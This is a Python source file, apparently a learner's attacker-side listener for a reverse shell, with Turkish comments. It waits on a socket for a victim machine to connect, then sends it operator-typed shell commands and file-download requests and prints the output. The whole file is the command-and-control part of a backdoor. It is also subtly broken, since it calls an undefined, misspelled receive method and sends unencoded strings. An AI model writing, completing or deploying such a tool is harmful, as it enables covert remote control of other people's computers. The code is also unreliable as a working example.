import socket
import subprocess
import shlex
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #eğer bağlantı koparsa socketi tekrar kullanmak için gardaş la

        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Baglanti bekleniyor")
        self.connection, address = listener.accept()
        print("[+] Baglanti -> " +str(address))


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def reliable_receive(self):
        json_data = b" "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
        

    def remote(self, command):
        # self.connection.send(command)

        try:
            if command.strip() == "!stop":
                    self.reliable_send(command)
                    print("Dinleme durdu")
                    return exit()
            
            if command.startswith("download "):
                self.reliable_send(command)

            elif self.is_system_command(command):
                #self.connection.send(command.encode("utf-8"))
                # self.reliable_send(command.encode("utf-8"))
                self.reliable_send(command)
                resultt = self.reliable_recieve()
                print(resultt)
            else:
                print("bu bir sistem komutu değil gönderilemedi")
                
        except socket.error as se:
            print("karşı tarafla olan bağlantı yok haci", se)
            return exit()
        except Exception as e :
            print("öngörülmemiş exception hatası: ", e)


    def is_system_command(self, command):
        cmd_parts = shlex.split(command)

        if subprocess.run(["which", cmd_parts[0]], capture_output=True).returncode == 0:
            return True
        return False



    def run(self):
        while True:
            command = input("-> ")
            # command = command.split(" ")
            self.remote(command)


my_listener = Listener("127.0.0.1", 4040)
my_listener.run( )

# while True:
#     command = input("-> ")
#     connection.send(command.encode("utf-8"))
#     result = connection.recv(1024)
#     print(result.decode("utf-8"))



